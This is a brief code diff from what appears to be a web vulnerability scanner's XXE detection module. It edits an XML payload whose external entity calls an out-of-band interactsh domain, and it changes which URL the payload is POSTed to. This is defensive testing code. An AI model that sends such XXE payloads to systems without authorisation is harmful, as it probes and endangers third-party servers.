@@ -137,10 +137,10 @@ class Generic_XXE(BaseSubmodule):
         post_body = f"""<?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [
 <!ELEMENT foo ANY >
-<!ENTITY % {rand_entity} SYSTEM "http://{subdomain_tag}.{self.parent_module.interactsh_domain}" >
+<!ENTITY {rand_entity} SYSTEM "http://{subdomain_tag}.{self.parent_module.interactsh_domain}" >
 ]>
 <foo>&{rand_entity};</foo>"""
-        test_url = f"{event.parsed_url.scheme}://{event.parsed_url.netloc}/"
+        test_url = event.parsed_url.geturl()
         r = await self.parent_module.helpers.curl(
             url=test_url, method="POST", raw_body=post_body, headers={"Content-type": "application/xml"}
         )
